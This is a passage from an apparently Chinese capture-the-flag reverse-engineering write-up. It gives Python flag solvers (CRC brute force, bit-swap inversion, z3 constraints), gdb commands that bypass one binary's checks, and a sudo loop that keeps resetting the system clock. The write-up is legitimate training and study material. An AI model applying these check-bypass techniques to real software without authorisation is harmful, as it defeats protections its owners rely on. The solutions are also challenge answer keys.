0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9, 0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d]\n\ndef crc32(num,a3):\n\ti = 0xffffffff\n\twhile True:\n\t\tv4 = a3\n\t\ta3 -= 1\n\t\tif (not v4):\n\t\t\treturn 0xffffffff - i\n\t\ta2 = num  & 0x7f\n\t\tnum = num >> 8\n\t\ti = (i >> 8) ^ (crc32_tab[(i ^ a2) & 0xff])\n\n\nhashes = [0xd641596f, 0x80a3e990, 0xc98d5c9b, 0x0d05afaf, 0x1372a12d, 0x5d5f117b, 0x4001fbfd, 0xa7d2d56b, 0x7d04fb7e, 0x2e42895e, 0x61c97eb3, 0x84ab43c3, 0x9fc129dd, 0xf4592f4d, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]\n\nflag = \"\"\ncount = 3\ncount_i = 0\nwhile count <= 42:\n\tfor i in string.printable:\n\t\tfor j in string.printable:\n\t\t\tfor l in string.printable:\n\t\t\t\ts = flag + i + j + l\n\t\t\t\t#print s,count,count_i\n\t\t\t\tif crc32( int(s[::-1].encode('hex'),16) , count ) == hashes[count_i]:\n\t\t\t\t\tflag = s\n\t\t\t\t\tcount += 3\n\t\t\t\t\tcount_i += 1\n\t\t\t\t\tprint(flag)\n\t\t\t\t\tbreak\n\t\nprint(flag)\n```\n\n\n\n### bitx\n\n![ucAmz6.png](https://s2.ax1x.com/2019/10/06/ucAmz6.png)\n\n将传入的flag按每字节与经过处理的data数据进行比较，逆向可求出flag\n\n![ucA6Wq.png](https://s2.ax1x.com/2019/10/06/ucA6Wq.png)\n\n```python\ndata = [0x8f, 0xaa, 0x85, 0xa0, 0x48, 0xac, 0x40, 0x95, 0xb6, 0x16, 0xbe, 0x40, 0xb4, 0x16, 0x97, 0xb1, 0xbe, 0xbc, 0x16, 0xb1, 0xbc, 0x16, 0x9d, 0x95, 0xbc, 0x41, 0x16, 0x36, 0x42, 0x95, 0x95, 0x16, 0x40, 0xb1, 0xbe, 0xb2, 0x16, 0x36, 0x42, 0x3d, 0x3d, 0x49]\n\nflag = \"\"\n\nfor i in range(len(data)):\n\ta = ((data[i] & 0xaa) >> 1)\n\tb = 2 * (data[i] & 0x55)\n\tflag += chr( ( a | b ) - 9 )\n\nprint(flag)\n```\n\n\n\n### 2018-rev\n\n直接运行\n\n![ucAgS0.png](https://s2.ax1x.com/2019/10/06/ucAgS0.png)\n\n提示C标准输入为以上要求，其中argc表示带入参数的个数，argv[0]指向输入的程序路径及名称，argv[1]指向参数para_1字符串，argv[1] [*]指向参数para_1字符串第 * 个字符，envp是系统的环境变量。\n\n可使用gdb，绕过判定条件。\n\n```shell\nset $r13d=2018\nset *((long *)0x7fffffffe48c)=1\nset *((long *)0x7fffffffe4a5)=1\n```\n\ncontinue后，又给出如下提示\n\n![ucAWOU.png](https://s2.ax1x.com/2019/10/06/ucAWOU.png)\n\n使用shell脚本更改时间\n\n```shell\nwhile true\ndo\n\tsudo date -us \"2018-01-01 00:00:00\"\ndone\n```\n\n再次使用以上绕过条件即可得出flag\n\n\n\n### what-the-hell\n\nelf文件，直接载入ida F5查看\n\n![ucA4w4.png](https://s2.ax1x.com/2019/10/06/ucA4w4.png)\n\n关键函数`calc_key3`和`decrypt_flag`\n\n`calc_key3`会对输入的两个数`v4`和`v5`进行验证，其验证方式可使用python中的`z3-solver`和`gmpy2`库进行求解\n\n`z3-solver`库安装命令 `pip install z3-solver`\n\n其中`what()`函数为`key`计算，通过1-9999998遍历，使用斐波那契递数列归计算出与输入第二个参数匹配的`i`，返回`key2 * i + 1`\n\n下面用python计算出通过验证的两个参数\n\n```python\nimport z3\nimport gmpy2\nimport math \n\nx = BitVec('x',32)\ny = BitVec('y',32)\n\nsolver = Solver()\n\nsolver.add(x * y == 0xDDC34132)\nsolver.add((x ^ 0x7e) * (y + 16) == 0x732092BE)\nsolver.add( ((x & 0xffff) - (y & 0xffff)) & 0xFFF == 3295)\n\nwhile solver.check() == sat : \n\ta = bytes(solver.model()[x])\n\tif gmpy2.is_prime(int(a)):\n\t\tprint(solver.model())\n\tsolver.add(Or(solver.model()[x] != x))\n```\n\n由于原程序递归耗时过长，用非递归方式模拟原程序计算出flag\n\n```python\nimport math\nimport time\n\njunk_data = [0x09, 0x23, 0x8c, 0xb9, 0x2f, 0x19, 0x8d, 0xf8, 0xf3, 0x79, 0x81, 0x87, 0x93, 0x99, 0x35, 0x52, 0x9c, 0xf0, 0x34, 0x99, 0x23, 0xb1, 0x84, 0x1d, 0xf0, 0x8f, 0x7e, 0x45, 0x0f, 0xcb, 0x40, 0xf8, 0x4e, 0xd1, 0x42, 0x29, 0x76, 0x17, 0x43, 0xe1, 0xac, 0x04, 0x37, 0xa0, 0xe4, 0x30, 0x59, 0xa9, 0x68, 0xd9, 0x1c, 0x96, 0xfc, 0x1d, 0x85, 0xea, 0xd2, 0x94, 0x07, 0x90, 0x09, 0xd2, 0xc9, 0x19, 0x86, 0xc9, 0xdc, 0x24, 0x6f, 0x3b, 0x5c, 0x92, 0x4c, 0x9f, 0xd9, 0x50, 0xdd, 0x98, 0x37, 0x1c, 0xb1, 0xda, 0xa5, 0x44, 0xf2, 0x8e, 0x43, 0x66, 0x91, 0xa3, 0xdf, 0xaf, 0x3a, 0x7e, 0x65, 0x91, 0x19, 0x22, 0xfd, 0xfe, 0x14, 0xba, 0x0a, 0xe1, 0xb9, 0x61, 0x73, 0x86, 0xe1, 0x96, 0xc1, 0x67, 0xce, 0x06, 0x25, 0x74, 0xf0, 0x2e, 0xa3, 0xbb, 0xed, 0x68, 0x3e, 0x53, 0x30, 0x43, 0x0e, 0x53, 0xb8, 0x8a, 0x9c, 0x95, 0x41, 0xc3, 0xb0, 0x25, 0x1c, 0xcb, 0x38, 0x86, 0xa6, 0x7a, 0x6f, 0xf2, 0x63, 0x0a, 0x19, 0x7c, 0x07, 0xda, 0x6f, 0xa2, 0x4e, 0xd2, 0x74, 0x4a, 0xf9, 0xaf, 0xc2, 0x9c, 0xfd, 0x89, 0xe6, 0x04, 0x11, 0xf6, 0x6f, 0xf5, 0x98, 0x55, 0x9d, 0x37, 0x12, 0xf2, 0xa6, 0x66, 0xbe, 0x85, 0x87, 0x8e, 0x87, 0x64, 0x5e, 0xa0, 0x61, 0x52, 0xd8, 0xbb, 0x39, 0x3d, 0x7b, 0xd2, 0x47, 0x27, 0x37, 0x30, 0xb5, 0xf8, 0x90, 0xfc, 0x50, 0xf3, 0xc1, 0x5c, 0x6b, 0xa4, 0xbe, 0x8d, 0xa5, 0xea, 0xdd, 0x72, 0xf2, 0x28, 0xe1, 0x74, 0xef, 0x07, 0x10, 0xcf, 0x39, 0x7d, 0x58, 0xe7, 0x46, 0x09, 0x04, 0xe9, 0xe9, 0x37, 0xd7, 0xe1, 0x20, 0xf9, 0xc2, 0x54, 0x28, 0xe7, 0x30, 0xe8, 0x86, 0x58, 0x77, 0x6c, 0x7d, 0x2e, 0x00, 0xce, 0xcc, 0x9c, 0xfb, 0xa3, 0x8d, 0xd1, 0x04, 0x98, 0x9d, 0x4f, 0xe8, 0x1f, 0x60, 0x3a, 0x8a, 0x5b, 0x1a, 0x11, 0x55, 0xf0, 0x6b, 0xcf, 0xd8, 0x6d, 0x75, 0x30, 0x9a, 0xd8, 0xd8, 0x5d, 0x2e, 0x90, 0x7e, 0x43, 0x5c, 0xeb, 0x3f, 0x26, 0x78, 0xaf, 0xb3, 0xb0, 0xc3, 0x1c, 0xe9, 0xab, 0x94, 0xe6, 0xc1, 0x49, 0x25, 0x4b, 0xaa, 0xff, 0x59, 0xe1, 0x11, 0x48, 0x3c, 0xb9, 0x16, 0x67, 0x27, 0xf9, 0xa0, 0x29, 0x68, 0x2e, 0xfb, 0x45, 0x5d, 0x29, 0x12, 0x0a, 0x36, 0x04, 0x54, 0xb3, 0xcf, 0x87, 0x24, 0x37, 0x8e, 0x7c, 0x5a, 0xef, 0xf8, 0x33, 0xe2, 0xe0, 0x89, 0x83, 0xa8, 0x4d, 0x72, 0x28, 0x80, 0xaa, 0xd4, 0x0e, 0xdd, 0x72, 0xa5, 0x0b, 0xad, 0x85, 0x6f, 0xee, 0x44, 0xad, 0x43, 0x7d, 0x30, 0xc2, 0x15, 0xc9, 0x72, 0x12, 0x53, 0x8a, 0x37, 0x9d, 0xf2, 0x64, 0x1d, 0x21, 0x5e, 0x49, 0x78, 0x54, 0xc0, 0xf0, 0xa9, 0x81, 0xe3, 0x32, 0xd4, 0x99, 0x81, 0x88, 0x64, 0xfe, 0x20, 0x92, 0x89, 0xd0, 0xc9, 0x5a, 0xce, 0xfa, 0xb5, 0xe4, 0x2a, 0x9d, 0x50, 0xab, 0x32, 0x35, 0x8d, 0x31, 0x4c, 0x94, 0x6c, 0xc0, 0xef, 0xf4, 0xe2, 0x40, 0xf7, 0x47, 0x51, 0xdb, 0x1c, 0x6d, 0x3b, 0x6b, 0xea, 0xda, 0x16, 0x9a, 0x27, 0x68, 0xa3, 0x73, 0xbf, 0x9d, 0x40, 0x8f, 0x07, 0xf3, 0xc7, 0x65, 0x57, 0xb7, 0x7e, 0x0c, 0xea, 0xc9, 0x9f, 0x7f, 0x46, 0x82, 0xe6, 0x5c, 0xe6, 0xdf, 0xfe, 0x42, 0x41, 0x12, 0x62, 0x33, 0x74, 0xff, 0xe9, 0x52, 0xd1, 0x0f, 0x75, 0x88, 0x43, 0x17, 0x02, 0x5a, 0x9e, 0x29, 0xad, 0x40, 0x62, 0xdb, 0x1f, 0x2c, 0xe7, 0xa8, 0x6e, 0xac, 0x62, 0xc4, 0xbe, 0xec, 0x98, 0xb3, 0xe9, 0x44, 0xd4, 0x3e, 0xc3, 0x9e, 0x0f, 0xbc, 0xad, 0xc6, 0x28, 0x28, 0x95, 0x93, 0xd1, 0xd5, 0x03, 0xaa, 0x78, 0xe3, 0x0d, 0x20, 0x90, 0x58, 0x82, 0xcc, 0x5f, 0x46, 0xf9, 0x2c, 0x17, 0x55, 0xdb, 0x96, 0x0a, 0x34, 0x69, 0x6b, 0x87, 0x2b, 0xb2, 0x45, 0x9d, 0x7c, 0xea, 0xf3, 0xab, 0x19, 0x6a, 0xe3, 0x73, 0x9d, 0x84, 0x6c, 0x3a, 0x04, 0xb5, 0x07, 0x3d, 0x10, 0x3e, 0x67, 0x5e, 0x53, 0x86, 0xdb, 0xa0, 0x39, 0xab, 0xe0, 0x06, 0x22, 0x27, 0x8c, 0x81, 0xd3, 0xc6, 0x1f, 0x15, 0x35, 0x8d, 0x26, 0x8d, 0x67, 0x03, 0xbd, 0xc3, 0x76, 0xf7, 0x27, 0x29, 0x82, 0xaf, 0x64, 0x9d, 0x15, 0x0f, 0xbe, 0xad, 0xab, 0x39, 0x50, 0xd7, 0xb9, 0x1b, 0x0a, 0x3f, 0x99, 0xcc, 0x6a, 0xf5, 0xff, 0x5b, 0xde, 0x9f, 0xd1, 0x4d, 0xfc, 0xf4, 0x21, 0x83, 0xd0, 0x33, 0xab, 0xa4, 0x3e, 0x3b, 0x3a, 0x67, 0x41, 0xde, 0x93, 0xb1, 0x2a, 0xc4, 0x98, 0xda, 0xea, 0x51, 0xfd, 0xcf, 0xeb, 0xf0, 0xc7, 0x1f, 0xf6, 0x4c, 0xfc, 0x04, 0xef, 0x24, 0x51, 0xbf, 0x0d, 0xb0, 0x50, 0x2c, 0x06, 0xaa, 0x0e, 0x2f, 0x74, 0xb0, 0xd5, 0x27, 0xe7, 0xd3, 0xc4, 0xa7, 0x57, 0x0d, 0x31, 0xce, 0xd2, 0x5f, 0x6f, 0x99, 0x43, 0xdb, 0x93, 0x59, 0x24, 0xc0, 0xa8, 0x29, 0x3f, 0xda, 0x70, 0xbd, 0x92, 0x8a, 0xc5, 0x76, 0xf9, 0x31, 0x8b, 0x98, 0xd6, 0x0a, 0x7c, 0xa0, 0x8d, 0x9b, 0x96, 0x4a, 0x77, 0x5b, 0xc2, 0xe5, 0x46, 0x72, 0x28, 0x4f, 0x54, 0x44, 0x06, 0xb4, 0xe5, 0xb2, 0x6c, 0xef, 0x4e, 0x1e, 0x7e, 0xae, 0x0a, 0xc0, 0x7d, 0x1e, 0x6e, 0x80, 0x3a, 0xdf, 0x88, 0x07, 0x4b, 0xf8, 0xce, 0x3a, 0x40, 0x60, 0x6f, 0xda, 0x9f, 0xe4, 0xd9, 0x58, 0xa3, 0x19, 0xec, 0x5a, 0xd8, 0x85, 0x52, 0x1e, 0xa8, 0xca, 0x04, 0xdc, 0x5d, 0xd2, 0x77, 0x45, 0x35, 0xb0, 0x5a, 0xd1, 0xcd, 0xdc, 0x30, 0xa6, 0x14, 0xa6, 0xa1, 0xbf, 0x24, 0xe1, 0xde, 0xe6, 0xef, 0xa9, 0x0e, 0x00, 0x64, 0x5d, 0xef, 0x11, 0x4a, 0xf3, 0x38, 0x52, 0x86, 0x81, 0x6f, 0x42, 0xfb, 0x8b, 0x4b, 0x36, 0xfb, 0x79, 0x9d, 0x82, 0xbc, 0x0d, 0x01, 0x14, 0x42, 0x86, 0xd7, 0x65, 0xb4, 0x51, 0xbf, 0xec, 0x64, 0xe4, 0x61, 0x21, 0x63, 0x99, 0xd3, 0xc5, 0xfe, 0x58, 0x0a, 0xf5, 0xa1, 0xd5, 0xb0, 0xd9, 0xb4, 0x8a, 0x02, 0xc7, 0x50, 0xde, 0xde, 0xf2, 0xbe, 0x13, 0xf8, 0x3f, 0x23, 0x51, 0x4c, 0x19, 0x40, 0x74, 0xa6, 0x35, 0xba, 0x4b, 0x71, 0x1b, 0xae, 0xfe, 0x43, 0x8f, 0xa4, 0x25, 0xa5, 0xe5, 0x31, 0xb3, 0x17, 0x00, 0x83, 0x34, 0x4a, 0xba, 0x05, 0xcf, 0xbb, 0xb8, 0x67, 0x25, 0xe0, 0xd3, 0x53, 0xfc, 0xaa, 0xba, 0xb3, 0x6c, 0x8a, 0xec, 0x8f, 0x9c, 0xdb, 0x47, 0x05, 0x8e, 0x5a, 0x3e, 0xd4, 0x7b, 0x5f, 0xc5, 0x42, 0xd1, 0x6c, 0x2c, 0x99, 0xba, 0xfd, 0x9d, 0x6b, 0x52, 0xd2, 0x34, 0x86, 0x6a, 0x5d, 0x5e, 0x50, 0xb3, 0x58, 0xd4, 0x3a, 0xb7, 0x12, 0x46, 0x0e, 0x40, 0x81, 0xa5, 0x21, 0x5d, 0x5e, 0x63, 0xe5, 0x3b, 0x30, 0x3b, 0x6e, 0x13, 0x73, 0x36, 0x20, 0x3c, 0xe3, 0xa9, 0x99, 0x70, 0x49, 0x92, 0xfc, 0xfa, 0x70, 0x24, 0x6f, 0x7b, 0x1d, 0x93, 0x8d, 0x7d, 0xb4, 0xae, 0x2a, 0x7d, 0x53, 0x5c, 0x68, 0xea, 0xfa, 0x94, 0x58, 0x54, 0x28, 0xcf, 0x23, 0xfb, 0x70, 0x80, 0x7f, 0xf0, 0x4f, 0x2a, 0x0b, 0x94, 0xd7, 0x3e, 0x7f, 0x78, 0x45, 0xfc, 0xe3, 0xa9, 0x3e, 0x1e, 0x23, 0xa3, 0x7e, 0x06, 0x00, 0x1d, 0x66, 0x50, 0x9d, 0xd1, 0x1f, 0x65, 0x7e, 0x76, 0x8f, 0x47, 0x73, 0xf0, 0xaa, 0x3a, 0xc5, 0xb8, 0xb0, 0x65, 0xdd, 0x34, 0x48, 0x80, 0x30, 0x46, 0xe0, 0x0a, 0xdd, 0x1b, 0xc6, 0xd6, 0x88, 0xfb, 0x76, 0x0a, 0xa5, 0xe9, 0xb5, 0xc8, 0xbc, 0x0b, 0x82, 0x1c, 0x33, 0xa3, 0x4d, 0xd3, 0xce, 0x2f, 0x2a, 0x8e, 0xfa, 0xaa, 0xb2, 0x5d, 0x57, 0x89, 0x03, 0x56, 0x5f, 0xf2, 0x05, 0xf7, 0x24, 0xe6, 0xb6, 0x13, 0x84, 0xbc, 0x5d, 0xa5, 0x8f, 0x0d, 0xac, 0xc1, 0xa7, 0xdb, 0x2a, 0xdf, 0xb9, 0xda, 0x91, 0xfb, 0xf1, 0xd7, 0x83, 0x36, 0xcc, 0x3d, 0xbe, 0x14, 0xef, 0x51, 0x57, 0xe1, 0xbf, 0x6a, 0x3f, 0x5f, 0xea, 0xa8, 0x08, 0xb6, 0x83, 0x84, 0xa2, 0x8b, 0x2f, 0x13, 0x2b, 0x59, 0x9d, 0x86, 0x29, 0x22, 0x53, 0x17, 0xee, 0x15, 0x84, 0x3b, 0x1e, 0x2d, 0x10, 0xf0, 0x8b, 0xc3, 0xad, 0x4b, 0x45, 0x50, 0x06, 0x12, 0xaa, 0x94, 0x60, 0x07, 0x09, 0x6b, 0x2a, 0xda, 0xbf, 0x86, 0x90, 0x9a, 0xfb, 0xaf, 0xec, 0xbe, 0x05, 0x4a, 0x1e, 0xfc, 0x6e, 0xfe, 0x81, 0xc0, 0x1b, 0xb2, 0x39, 0x2f, 0x5c, 0x05, 0x40, 0xab, 0x0b, 0x4e, 0xe3, 0x69, 0x15, 0x9a, 0x3f, 0x70, 0x94, 0x10, 0xe7, 0x91, 0xef, 0x1e, 0x69, 0xe3, 0x6d, 0xf6, 0x43, 0xe5, 0xeb, 0xe4, 0x1e, 0xfe, 0xac, 0xaf, 0x64, 0xcd, 0xf0, 0x59, 0x07, 0x0b, 0x5a, 0xc8, 0xed, 0x19, 0x84, 0xd0, 0x4d, 0xf8, 0xcc, 0x85, 0x54, 0x75, 0xfc, 0xe8, 0x6e, 0x3f, 0x5e, 0xf8, 0xb6, 0x39, 0xdc, 0x7f, 0x24, 0x7d, 0x7e, 0x83, 0x3f, 0xf4, 0xb9, 0x8a, 0xe8, 0xc8, 0xdc, 0x7a, 0xfb, 0x2e, 0x63, 0xb2, 0x5c, 0x11, 0xf6, 0x8b, 0xfb, 0x83, 0x20, 0xba, 0x00, 0x9a, 0x04, 0xfb, 0xd5, 0xdd, 0x51, 0x8d, 0x90, 0x59, 0x0c, 0xf9, 0xa5, 0xef, 0x24, 0x98, 0x09, 0x26, 0x97, 0x32, 0x97, 0xbc, 0xaa, 0x3d, 0x82, 0x9e, 0xb0, 0x2d, 0xa8, 0x23, 0x76, 0xce, 0x5c, 0x59, 0x2a, 0x9f, 0x12, 0xaa, 0x60, 0x8d, 0x8f, 0x1f, 0xd1, 0xe1, 0x67, 0xc8, 0x2a, 0x19, 0x67, 0x66, 0x5b, 0x81, 0xae, 0x98, 0xd3, 0x3a, 0x17, 0xf5, 0xaa, 0xd6, 0x43, 0xf7, 0xd9, 0x6a, 0xa4, 0x71, 0x08, 0xfc, 0xfe, 0x5f, 0x01, 0xa4, 0x26, 0x06, 0x94, 0x95, 0xbb, 0xbe, 0x0a, 0xcf, 0x2d, 0x88, 0x1f, 0x7e, 0xbf, 0x21, 0x12, 0x51, 0x1e, 0xbc, 0xb9, 0xa3, 0x56, 0x20, 0x9c, 0x60, 0x82, 0x57, 0x41, 0x82, 0xcc, 0x91, 0xc8, 0xff, 0xef, 0xcd, 0xcf, 0x61, 0x17, 0xe5, 0xe9, 0x55, 0xa0, 0xfd, 0xd4, 0x12, 0x1b, 0x5c, 0xca, 0x75, 0x73, 0x19, 0x87, 0xd6, 0xd6, 0x08, 0x29, 0xee, 0xa9, 0x96, 0xfe, 0x7f, 0x6a, 0xba, 0x68, 0xe9, 0x88, 0x3f, 0xd7, 0x6b, 0xe1, 0x9c, 0x26, 0x45, 0x39, 0x28, 0x5b, 0xc1, 0xed, 0x40, 0xf3, 0x1c, 0x1e, 0x05, 0xc3, 0x69, 0x29, 0x7a, 0xf1, 0x48, 0xda, 0xb3, 0xb3, 0xf0, 0x86, 0xc9, 0xce, 0xdd, 0x29, 0xda, 0x53, 0xf5, 0x47, 0x1a, 0x11, 0x5e, 0x07, 0x5a, 0x94, 0x7c, 0x72, 0x21, 0x71, 0x63, 0xae, 0xb3, 0xec, 0x17, 0xa8, 0xc4, 0xdb, 0x13, 0x61, 0x58, 0xa4, 0x6c, 0x63, 0x0a, 0xa6, 0xd5, 0xc5, 0xff, 0x0e, 0xc3, 0x3b, 0xcb, 0xa2, 0x56, 0x04, 0x86, 0x32, 0x71, 0xbf, 0xd9, 0xe5, 0xed, 0x01, 0x52, 0xc8, 0xd3, 0x2d, 0x08, 0xf9, 0x6b, 0xf0, 0x53, 0x71, 0x23, 0x07, 0xa7, 0xdd, 0xa1, 0xa1, 0x39, 0xa8, 0x27, 0x7c, 0xad, 0xce, 0xba, 0x46, 0xde, 0xef, 0x5c, 0x8c, 0x98, 0xbe, 0xda, 0xae, 0x63, 0xf6, 0xdf, 0x4c, 0x7f, 0x29, 0x83, 0x65, 0x87, 0x09, 0x2b, 0xfb, 0x10, 0xc1, 0xdb, 0xff, 0x08, 0x2a, 0x9d, 0x87, 0x29, 0x86, 0x34, 0x0e, 0xa3, 0x43, 0x29, 0x46, 0x33, 0xf0, 0x6c, 0x53, 0x20, 0x89, 0x36, 0x49, 0x7e, 0x5b, 0x11, 0x80, 0xa6, 0x48, 0x80, 0xb9, 0xb9, 0x32, 0xb3, 0xc8, 0x16, 0xd2, 0x05, 0x47, 0x53, 0xb5, 0x96, 0x15, 0x82, 0x16, 0x3b, 0x25, 0x47, 0x53, 0x3e, 0x95, 0xea, 0xad, 0x9d, 0x91, 0x94, 0xf9, 0xd4, 0x8b, 0x53, 0x66, 0xae, 0x8c, 0x0e, 0x1f, 0xb0, 0xcf, 0xa4, 0x3e, 0x91, 0x9a, 0xe3, 0xde, 0xb5, 0xb0, 0xda, 0xf2, 0x9d, 0x0c, 0x79, 0xb6, 0x7b, 0x70, 0x0a, 0x50, 0x4f, 0x7a, 0x58, 0x33, 0x89, 0x74, 0x9d, 0xa7, 0xad, 0x71, 0x9c, 0xd0, 0x8f, 0xca, 0xc9, 0x51, 0xc7, 0x81, 0x0c, 0xc6, 0x6a, 0x8a, 0x52, 0xb6, 0x0c, 0xd9, 0x86, 0x92, 0x33, 0xdc, 0x9e, 0xa9, 0xe7, 0xf2, 0xed, 0xa5, 0x4a, 0x80, 0x5f, 0x00, 0xb7, 0xdb, 0x75, 0xa9, 0x81, 0x12, 0x56, 0xc7, 0xe8, 0x72, 0xcb, 0xc9, 0x62, 0x38, 0x03, 0x76, 0xb2, 0x57, 0xcd, 0x1a, 0xf7, 0xff, 0x3c, 0x1d, 0x5f, 0xb4, 0x4c, 0x90, 0x3e, 0x8d, 0x10, 0x7e, 0x33, 0xfd, 0x59, 0xd9, 0xad, 0xf5, 0x33, 0x58, 0x41, 0xff, 0xda, 0x8e, 0x06, 0x37, 0x52, 0x9e, 0x68, 0xfc, 0xcc, 0x59, 0xaa, 0x27, 0x11, 0x34, 0x02, 0x63, 0x00, 0x03, 0x06, 0x60, 0x90, 0xde, 0x07, 0xd9, 0x15, 0x8a, 0x71, 0x03, 0x6c, 0x6f, 0x4a, 0x56, 0x8f, 0x08, 0x7f, 0x63, 0xe0, 0xa9, 0x23, 0x5b, 0x27, 0xe8, 0xd7, 0xc0, 0x8e, 0xd6, 0xa0, 0x6f, 0xb5, 0x1d, 0x96, 0x39, 0x21, 0x76, 0x3c, 0x74, 0xdc, 0xa2, 0xc9, 0x3a, 0xcc, 0x1b, 0x67, 0x06, 0x1c, 0xf6, 0x48, 0xf4, 0x57, 0x31, 0x48, 0xf2, 0x07, 0xd7, 0xcf, 0xf7, 0x63, 0x50, 0xc0, 0x03, 0x15, 0x2e, 0xa0, 0x26, 0x48, 0xa6, 0x2f, 0x3f, 0xd2, 0x96, 0x0a, 0xee, 0x52, 0x1f, 0xbf, 0x1a, 0x0f, 0xb8, 0xaf, 0x32, 0xbc, 0x78, 0x46, 0x43, 0x36, 0x28, 0x30, 0x4e, 0x7b, 0x57, 0x0d, 0x58, 0xb5, 0xb6, 0x2e, 0x3d, 0x9b, 0x32, 0xca, 0x1c, 0x69, 0x74, 0x42, 0x13, 0xd3, 0x4f, 0x64, 0x2e, 0x1b, 0x65, 0xbb, 0x0a, 0x1f, 0xaa, 0xd9, 0x5e, 0xbd, 0x2f, 0xa0, 0xd3, 0xa8, 0xef, 0x1b, 0xac, 0xf8, 0x42, 0x96, 0x6f, 0xc3, 0x44, 0x6e, 0x2f, 0x97, 0x36, 0x9a, 0x18, 0x1e, 0x0d, 0xb9, 0xa0, 0x29, 0x5d, 0xcb, 0xd4, 0xe2, 0xbe, 0x55, 0x59, 0xa6, 0x26, 0x9e, 0x57, 0xaa, 0x62, 0xeb, 0xc0, 0x6d, 0x76, 0x45, 0x80, 0xc4, 0xdf, 0x91, 0x39, 0x32, 0xe9, 0xc3, 0xfd, 0x94, 0x49, 0xce, 0x8c, 0x98, 0xde, 0x4a, 0x6d, 0x6e, 0x60, 0xe7, 0x8d, 0x89, 0x95, 0x26, 0x8b, 0x79, 0x53, 0xbc, 0xb2, 0xfb, 0xc6, 0x9c, 0x9b, 0x99, 0xe2, 0x99, 0xe2, 0xae, 0xb8, 0x94, 0x62, 0x9b, 0x3f, 0x41, 0x5f, 0xc9, 0x4e, 0x64, 0xdc, 0x93, 0xfa, 0xb8, 0x0b, 0x9e, 0x6e, 0x2f, 0x92, 0xd9, 0xdb, 0xcf, 0xfa, 0x85, 0x9f, 0x0e, 0xb0, 0x54, 0x72, 0x4a, 0x3d, 0xfa, 0x48, 0x10, 0xfe, 0x14, 0x4d, 0x6f, 0xa2, 0x65, 0x80, 0xf1, 0x86, 0xe3, 0x37, 0x28, 0x6b, 0x7d, 0x7f, 0xf0, 0x62, 0xcf, 0x8e, 0x66, 0x3e, 0xe3, 0x65, 0xdd, 0x26, 0xde, 0xa4, 0x0d, 0x6d, 0x26, 0x1c, 0x5d, 0x69, 0x70, 0xbe, 0x99, 0xe2, 0xd1, 0xdb, 0xde, 0xc2, 0x90, 0xf5, 0xb1, 0x69, 0x2e, 0x75, 0x3c, 0xb1, 0xa5, 0x93, 0xf8, 0x01, 0x40, 0xe7, 0x39, 0x42, 0x0c, 0x39, 0xe0, 0xed, 0x97, 0xc3, 0xba, 0x89, 0x77, 0xc3, 0xb6, 0x5e, 0xa8, 0x40, 0xf6, 0x8f, 0x32, 0xb3, 0x23, 0x9e, 0x92, 0xdb, 0x10, 0xb2, 0xd0, 0xfd, 0xb4, 0x32, 0x2e, 0xb3, 0xc6, 0x24, 0x6f, 0xce, 0x01, 0xce, 0x27, 0xd8, 0x5c, 0x7d, 0xa5, 0x1f, 0xcc, 0x48, 0x53, 0x07, 0x8f, 0x8b, 0x53, 0xad, 0x94, 0xba, 0xe7, 0x62, 0xeb, 0x53, 0xea, 0xec, 0xa0, 0x05, 0x94, 0x0c, 0xd4, 0x72, 0x6d, 0x24, 0x50, 0xc1, 0x85, 0xa3, 0xbb, 0x51, 0x52, 0x13, 0xcf, 0xf3, 0x39, 0x3f, 0x5b, 0x5a, 0x6d, 0xbd, 0xb6, 0x9b, 0xae, 0x4c, 0x60, 0x1a, 0x9c, 0x48, 0x40, 0x6e, 0x0a, 0xc5, 0x96, 0x25, 0xce, 0x0a, 0x26, 0x9a, 0x0e, 0x47, 0xad, 0xc8, 0x43, 0x0c, 0xd7, 0xf8, 0xb7, 0x5b, 0xaa, 0x3b, 0x16, 0xbf, 0x8a, 0xff, 0x7b, 0x0f, 0xf3, 0x5f, 0x0b, 0x4d, 0x62, 0xe1, 0x3c, 0x5e, 0xe0, 0x70, 0xb6, 0x31, 0xf9, 0xbf, 0xc3, 0x77, 0xde, 0xb6, 0x17, 0xf6, 0x0e, 0x53, 0x32, 0x3e, 0x3f, 0x93, 0x73, 0xe7, 0x72, 0xce, 0x8d, 0xc3, 0xfe, 0x89, 0xef, 0xd7, 0xca, 0xea, 0x85, 0xb2, 0xf0, 0xf2, 0xb8, 0x7b, 0x46, 0xb7, 0x71, 0x98, 0x79, 0x8b, 0xac, 0x0b, 0xda, 0x4c, 